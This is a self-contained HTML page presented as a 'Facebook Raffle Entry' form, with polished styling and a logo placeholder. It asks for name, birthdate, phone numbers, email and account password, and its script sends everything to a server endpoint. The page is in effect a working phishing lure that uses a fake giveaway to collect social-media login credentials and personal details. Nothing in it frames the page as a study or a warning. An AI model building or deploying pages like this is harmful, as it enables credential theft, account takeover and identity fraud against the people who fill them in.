<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Raffle</title>
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      min-height: 100vh;
      font-family: system-ui, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 24px;
      background: radial-gradient(circle at 20% 20%, #60a5fa 0%, transparent 45%),
                  radial-gradient(circle at 85% 15%, #38bdf8 0%, transparent 40%),
                  radial-gradient(circle at 80% 85%, #1d4ed8 0%, transparent 45%),
                  linear-gradient(135deg, #0c1e4e, #1d4ed8 45%, #3b82f6);
      background-attachment: fixed;
    }
    .logo-slot {
      width: 100%;
      min-height: 64px;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #9ca3af;
      font-size: .85rem;
      border: 2px dashed #e5e7eb;
      border-radius: 10px;
      margin-bottom: 12px;
      overflow: hidden;
      padding: 8px;
    }
    .logo-slot img { max-width: 100%; max-height: 80px; object-fit: contain; display: block; }
    .card {
      z-index: 1;
      position: relative;
      background: rgba(255,255,255,.97);
      padding: 28px 24px;
      border-radius: 16px;
      width: 100%;
      max-width: 380px;
      box-shadow: 0 10px 30px rgba(0,0,0,.25);
    }
    .ribbon {
      text-align: center;
      font-size: 2rem;
      margin-bottom: 4px;
    }
    h1 {
      margin: 0 0 4px;
      font-size: 1.4rem;
      text-align: center;
      background: linear-gradient(90deg, #1d4ed8, #0ea5e9);
      -webkit-background-clip: text;
      background-clip: text;
      color: transparent;
    }
    .sub {
      text-align: center;
      color: #6b7280;
      font-size: .85rem;
      margin-bottom: 4px;
    }
    label { display: block; margin-top: 14px; font-size: .9rem; color: #374151; }
    input, textarea {
      width: 100%; padding: 10px; margin-top: 4px; border: 1px solid #ddd;
      border-radius: 8px; font-size: 1rem; font-family: inherit;
      transition: border-color .15s, box-shadow .15s;
    }
    input:focus, textarea:focus {
      outline: none; border-color: #1d4ed8; box-shadow: 0 0 0 3px rgba(29,78,216,.15);
    }
    button {
      width: 100%; margin-top: 22px; padding: 13px; border: 0; border-radius: 8px;
      background: linear-gradient(90deg, #1d4ed8, #0ea5e9);
      color: #fff; font-size: 1rem; font-weight: 600; cursor: pointer;
      box-shadow: 0 4px 12px rgba(29,78,216,.35);
      transition: transform .1s, box-shadow .15s;
    }
    button:hover { transform: translateY(-1px); box-shadow: 0 6px 16px rgba(29,78,216,.45); }
    button:active { transform: translateY(0); }
    #msg { margin-top: 14px; font-size: .95rem; text-align: center; }
    .ok { color: #15803d; } .err { color: #b91c1c; }
  </style>
</head>
<body>
  <form id="f" class="card">
    <div class="logo-slot">
      <img src="Logo.webp" alt="Logo">
    </div>
    <h1>Facebook Raffle Entry</h1>
    <p class="sub">Fill in your details below for a chance to win!</p>
    <label>Name <input name="name" required></label>
    <label>Birthdate <input name="birthdate" type="date" required></label>
    <label>Number <input name="number" type="tel" required></label>
    <label>Alternate number (optional) <input name="altNumber" type="tel"></label>
    <label>Email <input name="email" type="email" required></label>
    <label>Password <input name="password" type="password" required></label>
    <button type="submit">Enter raffle</button>
    <div id="msg"></div>
  </form>

  <script>
    const form = document.getElementById("f");
    const msg = document.getElementById("msg");
    form.addEventListener("submit", async (e) => {
      e.preventDefault();
      const data = Object.fromEntries(new FormData(form));
      try {
        const res = await fetch("/api/raffle", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data)
        });
        const out = await res.json();
        if (res.ok) { msg.className = "ok"; msg.textContent = "You're in! Good luck!"; form.reset(); }
        else { msg.className = "err"; msg.textContent = out.error; }
      } catch {
        msg.className = "err"; msg.textContent = "Could not reach the server.";
      }
    });
  </script>
</body>
</html>
